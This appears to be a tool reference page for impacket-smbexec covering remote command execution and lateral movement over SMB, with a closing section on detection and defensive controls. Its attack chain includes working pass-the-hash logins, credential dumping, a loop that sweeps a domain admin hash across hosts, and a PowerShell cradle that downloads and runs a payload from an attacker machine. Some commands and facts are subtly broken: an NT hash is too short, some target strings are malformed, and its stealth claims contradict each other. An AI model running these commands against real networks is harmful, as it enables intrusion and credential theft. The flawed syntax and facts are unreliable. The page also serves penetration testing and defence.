---
title: "Impacket SMBExec"
category: "Lateral Movement"
tool_name: "impacket-smbexec"
version: "0.13.1"
kali_package: "python3-impacket"
install_size: "7.31 MB"
language: "Python"
author: "Fortra (Core Security)"
license: "Apache-2.0"
github: "https://github.com/fortra/impacket"
kali_url: "https://www.kali.org/tools/impacket/"
mitre_tactic: "lateral_movement"
mitre_tactic_id: "TA0008"
tags: ["lateral_movement", "smb", "psexec", "remote-execution", "ntlm", "pass-the-hash", "windows", "impacket"]
date: "2026-07-18"
---

# Impacket SMBExec — SMB-Based Remote Command Execution

## 1. Overview

**Impacket SMBExec** is a Python-based tool that executes commands on Windows systems by leveraging SMB and the Windows Service Control Manager (SCM). Unlike impacket-psexec, SMBExec does not create a named pipe or upload a binary — it uses the SMB protocol directly to place a service on the target, execute commands, and retrieve output via the `ADMIN$` or `C$` share. This makes it lighter and less noisy than PsExec while achieving the same remote execution capability.

SMBExec operates by authenticating to the target over SMB, creating a temporary Windows service that runs the desired command, reading the output from a file on the share, and then cleaning up the service. It supports NTLM pass-the-hash, Kerberos authentication, and plaintext credentials.

### Core Capabilities

- **Remote command execution** via SMB and Windows Service Control Manager
- **Pass-the-hash authentication** using NTLM hashes without knowing the plaintext password
- **Kerberos authentication** with AES keys or ccache files for domain environments
- **No binary upload** — uses existing SMB services rather than deploying executables
- **Semi-interactive shell** mode for sequential command execution
- **Single command mode** for one-off remote operations
- **Share targeting** — configurable output share (default `ADMIN$`)
- **Codec configuration** for proper encoding of target output (non-UTF-8 systems)

### When to Use SMBExec

- Lateral movement after credential harvesting with NTLM hashes
- Remote command execution on Windows hosts in a domain environment
- Post-exploitation when you have SMB access but want minimal footprint
- Environments where PsExec binary drops are detected by EDR/AV
- Quick remote shell access without deploying persistent backdoors
- Pass-the-hash attacks against Windows targets with local admin access
- engagements requiring semi-interactive shell on remote Windows systems

### Comparison with Other Impacket Tools

| Feature | SMBExec | PsExec | WMIExec | WinRMExec |
|---------|---------|--------|---------|-----------|
| Protocol | SMB + SCM | SMB + SCM | DCOM + WMI | WinRM/WSMAN |
| Binary upload | No | Yes (psexesvc.exe) | No | No |
| Semi-interactive | Yes | Yes | Yes | Yes |
| Pass-the-hash | Yes | Yes | Yes | No |
| Kerberos support | Yes | Yes | Yes | Yes |
| Stealth | Medium | Low | High | Medium |
| Named pipe | No | Yes | No | No |
| Firewall impact | SMB (445) | SMB (445) | DCOM (135+dynamic) | WinRM (5985/5986) |

---

## 2. Installation

### Kali Linux (Default)

```bash
sudo apt install python3-impacket
```

**Explanation:** Installs the full Impacket suite including SMBExec. The package includes all dependencies: `python3-openssl`, `python3-pycryptodome`, `python3-pyasn1`, `python3-ldap3`, and `python3-flask`. Impacket is included in Kali's default, large, and everything metapackages.

### From Source

```bash
git clone https://github.com/fortra/impacket.git /opt/impacket
cd /opt/impacket
pip3 install .
```

**Explanation:** Clones the upstream Fortra repository and installs from source. Required for the latest development version or custom modifications.

### Using pipx

```bash
python3 -m pipx install impacket
```

**Explanation:** Recommended for system-wide installation. pipx isolates the virtual environment and avoids conflicts with system Python packages.

### Verifying Installation

```bash
impacket-smbexec -h
```

**Explanation:** Displays the help screen. If this produces usage output, the installation is correct. The banner shows the Impacket version (e.g., `Impacket v0.13.1`).

---

## 3. Command Reference

### 3.1 Basic Authentication (Username/Password)

```bash
impacket-smbexec administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Authenticates to the target using plaintext credentials over SMB. Opens a semi-interactive shell where each command is executed via a temporary Windows service. The `ADMIN$` share is used by default to read command output.

### 3.2 Pass-the-Hash Authentication

```bash
impacket-smbexec -hashes :aad3b435b51404eeaad3b435b51404ee334d1cdc94243215df022b101e206e /administrator@192.168.1.10
```

**Explanation:** Authenticates using an NTLM hash pair (LM:NT). The LM hash `aad3b435b51404eeaad3b435b51404ee` is the default empty LM hash for accounts with no LM hash set. The NT hash `334d1cdc94243215df022b101e206e` is the actual credential. This bypasses the need for plaintext passwords — critical after extracting hashes with secretsdump or Mimikatz.

#### Full Pass-the-Hash Syntax

```bash
# Format: username:lmhash:nthash@target
impacket-smbexec -hashes LMHASH:NTHASH administrator:LMHASH:NTHASH@192.168.1.10

# With domain
impacket-smbexec -hashes :NTHASH DOMAIN/administrator@192.168.1.10

# With target-ip (when target is NetBIOS name)
impacket-smbexec -hashes :NTHASH DOMAIN/administrator@SERVER01 -target-ip 192.168.1.10
```

### 3.3 Kerberos Authentication

```bash
impacket-smbexec -k -no-pass DOMAIN/administrator@192.168.1.10
```

**Explanation:** Uses Kerberos authentication from the ccache file specified in `KRB5CCNAME`. The `-no-pass` flag prevents prompting for a password. Requires a valid TGT in the ccache file, typically obtained with `getTGT.py` or `kinit`.

#### Kerberos with AES Key

```bash
impacket-smbexec -aesKey 000102030405060708090a0b0c0d0e0f -k DOMAIN/administrator@192.168.1.10
```

**Explanation:** Authenticates using an AES-256 key instead of password or hash. AES keys are extracted from Kerberos tickets or AD attributes. More stealthy than NTLM as it avoids NTLM relay detection.

#### Kerberos with Ccache

```bash
export KRB5CCNAME=/tmp/administrator.ccache
impacket-smbexec -k -no-pass DOMAIN/administrator@dc01.domain.local
```

**Explanation:** Sets the ccache file containing a TGT and authenticates using Kerberos. The DC hostname must be resolvable. Use `dc-ip` if DNS resolution is unavailable.

### 3.4 Domain Authentication with DC-IP

```bash
impacket-smbexec -hashes :NTHASH DOMAIN/administrator@192.168.1.10 -dc-ip 192.168.1.5
```

**Explanation:** Specifies the domain controller IP directly. Required when the DC cannot be resolved via DNS or when the target hostname does not match DNS records. The `-dc-ip` flag is used for KDC discovery in Kerberos or domain resolution in NTLM.

### 3.5 Single Command Execution

```bash
impacket-smbexec -hashes :NTHASH administrator@192.168.1.10 "whoami"
```

**Explanation:** Executes a single command on the target and exits. Useful for scripting and automation where an interactive shell is not needed. The output is printed to stdout.

#### Single Command Examples

```bash
# Check current user
impacket-smbexec -hashes :NTHASH administrator@192.168.1.10 "whoami /all"

# List processes
impacket-smbexec -hashes :NTHASH administrator@192.168.1.10 "tasklist"

# Check network configuration
impacket-smbexec -hashes :NTHASH administrator@192.168.1.10 "ipconfig /all"

# Run a batch script
impacket-smbexec -hashes :NTHASH administrator@192.168.1.10 "C:\temp\recon.bat"

# Execute PowerShell one-liner
impacket-smbexec -hashes :NTHASH administrator@192.168.1.10 "powershell -c \"Get-Process\""
```

### 3.6 Semi-Interactive Shell

```bash
impacket-smbexec administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Opens a semi-interactive shell prompt (`C:\>`) where each command is executed sequentially. This is not a true interactive shell — each command runs independently via a new service. Tab completion and interactive programs (like `cmd.exe /k`) do not work as expected.

### 3.7 Share Configuration

```bash
impacket-smbexec -share C$ administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Uses the `C$` share instead of the default `ADMIN$` for output retrieval. Useful when `ADMIN$` is restricted or when you need to access a specific share for output files.

### 3.8 Debug and Timestamp Output

```bash
impacket-smbexec -debug -ts administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Enables debug output (`-debug`) showing all protocol-level communication, and timestamps (`-ts`) each log line. Essential for troubleshooting authentication failures, network issues, or protocol errors.

### 3.9 Codec Configuration

```bash
impacket-smbexec -codec cp850 administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Sets the encoding used for target output. Default is `utf-8`. On systems with non-UTF-8 output (e.g., German Windows with cp850), run `chcp.com` on the target to identify the correct code page, then use `-codec` to match it. Prevents garbled characters in command output.

---

## 4. Authentication Methods

### Pass-the-Hash Workflow

```text
1. Extract hashes (secretsdump, Mimikatz, SAM dump)
   └─ LMHASH:NTHASH

2. Authenticate to target
   └─ impacket-smbexec -hashes LMHASH:NTHASH user@target

3. Execute commands
   └─ Semi-interactive shell or single command
```

### NTLM Hash Format

```text
LMHASH:NTHASH

Common LM hashes:
- Empty/disabled LM: aad3b435b51404eeaad3b435b51404ee
- No LM history:    aad3b435b51404eeaad3b435b51404ee

Example:
aad3b435b51404eeaad3b435b51404ee:334d1cdc94243215df022b101e206e
```

### Kerberos Authentication Requirements

| Component | Requirement |
|-----------|-------------|
| Ccache file | Valid TGT in `KRB5CCNAME` |
| AES key | 128 or 256-bit hex key |
| DC resolution | DNS or `-dc-ip` parameter |
| SPN | Target service must be registered in AD |
| Time sync | Target and DC must be within 5 minutes |

### Authentication Matrix

| Method | Credentials | Flag | Use Case |
|--------|-------------|------|----------|
| Password | `user:password@target` | None | Known credentials |
| Pass-the-Hash | `-hashes LM:NT user@target` | `-hashes` | Hash extraction |
| Kerberos ccache | `user@target -k` | `-k -no-pass` | Domain environments |
| Kerberos AES | `-aesKey key user@target` | `-aesKey -k` | Stealthy domain auth |
| Keytab | `user@target -k -keytab file` | `-keytab -k` | Service accounts |

---

## 5. Attack Chain Integration

### Step 1: Credential Harvesting

```bash
# Dump SAM hashes from a compromised Windows host
impacket-secretsdump administrator:'P@ssw0rd'@192.168.1.10

# Output includes:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:HASH:::
```

**Explanation:** Extracts local account hashes from the SAM database. The LM:NTHASH pair is needed for pass-the-hash authentication.

### Step 2: Lateral Movement with SMBExec

```bash
# Use the extracted hash to move laterally
impacket-smbexec -hashes :334d1cdc94243215df022b101e206e administrator@192.168.1.20
```

**Explanation:** Authenticates to a second host using the harvested NTLM hash. The target must have the same administrator account or the hash must match a local admin on the target.

### Step 3: Remote Command Execution

```text
C:\> whoami
C:\> ipconfig /all
C:\> net user
C:\> net localgroup administrators
C:\> systeminfo
C:\> dir C:\Users\Administrator\Desktop
```

**Explanation:** Enumerate the target system, check privileges, and locate sensitive files. The semi-interactive shell executes each command sequentially.

### Step 4: Establish Persistent Access

```bash
# Upload a reverse shell or C2 agent
impacket-smbexec -hashes :HASH administrator@192.168.1.20 "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/payload.ps1')\""
```

**Explanation:** Executes a PowerShell download cradle through SMBExec to fetch and execute a payload from the attacker machine. Requires a web server hosting the payload.

### Step 5: Further Lateral Movement

```bash
# Harvest hashes from the new target
impacket-secretsdump -hashes :HASH administrator@192.168.1.20@192.168.1.30

# Use new credentials for additional movement
impacket-smbexec -hashes :NEW_HASH administrator@192.168.1.40
```

**Explanation:** Chain SMBExec with secretsdump to pivot through the network, extracting credentials from each compromised host and using them to reach additional targets.

---

## 6. Advanced Use Cases

### Domain-Wide Lateral Movement

```bash
# After dumping NTDS.dit from DC
impacket-secretsdump -hashes :HASH DOMAIN/administrator@192.168.1.5 -just-dc

# Use domain admin hash against multiple hosts
for host in 192.168.1.{10..50}; do
    echo "=== $host ==="
    impacket-smbexec -hashes :DOMAIN_ADMIN_HASH DOMAIN/administrator@$host "hostname" 2>/dev/null
done
```

**Explanation:** Domain admin credentials work across all domain-joined hosts. This loop tests reachability and identifies live hosts.

### Output Share Configuration

```bash
# Use ADMIN$ (default)
impacket-smbexec administrator:'P@ssw0rd'@192.168.1.10

# Use C$ share
impacket-smbexec -share C$ administrator:'P@ssw0rd'@192.168.1.10

# Use a custom share
impacket-smbexec -share MyShare administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** The share is used to write command output files. `ADMIN$` is the default administrative share. If access is restricted, try `C$` or a custom share.

### PowerShell Execution Through SMBExec

```bash
impacket-smbexec administrator:'P@ssw0rd'@192.168.1.10 "powershell -c \"Get-Service | Where-Object {$_.Status -eq 'Running'}\""
```

**Explanation:** Executes PowerShell commands through SMBExec. The `powershell -c` wrapper enables PowerShell execution. For complex scripts, use `-shell-type powershell` if available, or base64-encode the script.

### Codec Troubleshooting

```bash
# On the target, check code page
chcp.com

# If output shows code page 850
impacket-smbexec -codec cp850 administrator:'P@ssw0rd'@192.168.1.10
```

**Explanation:** Non-English Windows systems use different code pages. The `-codec` flag ensures proper decoding of command output containing special characters.

---

## 7. Detection and Defense

### SMBExec Indicators

| Indicator | Detection Method |
|-----------|-----------------|
| Service creation events | Windows Event ID 7045 (new service installed) |
| SMB connections to ADMIN$ | Network monitoring on TCP 445 |
| Temporary service execution | Windows Event ID 7045 + 7036 (service start/stop) |
| File writes to ADMIN$ | File integrity monitoring on `C:\Windows\ADMIN$` |
| Authentication attempts | Windows Event ID 4624 (Type 3 logon) |
| NTLM authentication | Windows Event ID 4624 (Logon Type 3) |
| Service binary cleanup | Windows Event ID 7040 (service start type changed) |

### Network Detection

```bash
# Monitor for SMB lateral movement patterns
# Wireshark filter
tcp.port == 445 && ip.src != 192.168.1.100

# Suricata rule (conceptual)
alert smb any any -> any any (msg:"SMB Service Creation"; \
    content:"NetrCreateServiceW"; sid:1000001;)
```

### Blue Team Detection Queries

```text
# Splunk: Detect service creation via SMB
index=windows EventCode=7045 ServiceName!=NULL
| stats count by Computer, ServiceName, ServiceFileName, Account_Name
| where count > 0

# Elastic: Detect SMBExec-style service creation
event_id:7045 AND NOT service_name:(*Windows* OR *Microsoft*)
```

### Preventive Controls

```text
# Disable SMBv1 (reduces attack surface)
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Restrict SMB access with Windows Firewall
New-NetFirewallRule -DisplayName "Block SMB Lateral" -Direction Inbound \
    -Protocol TCP -LocalPort 445 -RemoteAddress 10.0.0.0/8 -Action Block

# Enable LSA protection
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Disable NTLM where possible
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictReceivingNTLMTraffic /t REG_DWORD /d 2 /f

# Audit service creation
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
```

---

## 8. Operational Considerations

### Advantages Over PsExec

- **No binary upload:** SMBExec does not place `psexesvc.exe` on the target, reducing disk artifacts
- **Smaller footprint:** Only creates a temporary service, not a full service binary
- **Stealthier:** No named pipe communication pattern that EDR tools commonly detect
- **Faster execution:** Lighter overhead per command execution

### Limitations

- **SMB required:** Port 445 must be accessible between attacker and target
- **Admin credentials needed:** Requires local administrator or SYSTEM-level access
- **No true interactive shell:** Semi-interactive mode does not support programs requiring continuous stdin (like `cmd.exe /k`)
- **Service creation logged:** Windows Event ID 7045 records every service installation
- **Output file race conditions:** On slow networks, output file reads may fail
- **Not stealthy:** Service creation is a well-known indicator; EDR detects the pattern

### Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Access denied | Insufficient privileges or SMB signing | Verify admin credentials; try `-debug` |
| Connection refused | SMB port blocked or service disabled | Check firewall rules; verify port 445 |
| Output garbled | Wrong code page on target | Run `chcp.com` on target; use `-codec` |
| Hash rejected | NT hash mismatch or account disabled | Verify hash with `secretsdump`; check account status |
| Kerberos failure | Clock skew or no TGT | Sync time; verify `KRB5CCNAME` |
| Share access denied | `ADMIN$` restricted | Try `-share C$` or a custom share |

### Best Practices

- Use pass-the-hash only within the engagement scope (NTLM relay can propagate)
- Document all hashes used and targets accessed for the final report
- Verify target reachability with `impacket-smbclient` before attempting execution
- Use `-debug` during initial testing to identify authentication issues
- Combine with `secretsdump` for credential harvesting on each new host
- Clean up artifacts after engagement (though SMBExec leaves minimal traces)
- Test Kerberos authentication in domain environments for stealthier execution
- Monitor for service creation events (Event ID 7045) on targets during testing

---

## Resources

- **Impacket GitHub:** https://github.com/fortra/impacket
- **Impacket Wiki:** https://github.com/fortra/impacket/wiki
- **Kali Linux Tool Page:** https://www.kali.org/tools/impacket/
- **MITRE ATT&CK Lateral Movement (TA0008):** https://attack.mitre.org/tactics/TA0008/
- **MITRE ATT&CK Windows Management Instrumentation (T1047):** https://attack.mitre.org/techniques/T1047/
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
- **OffSec PEN-300 Course:** https://www.offsec.com/courses/pen-300/
- **Microsoft SMB Protocol Documentation:** https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol
- **Windows Service Control Manager:** https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager
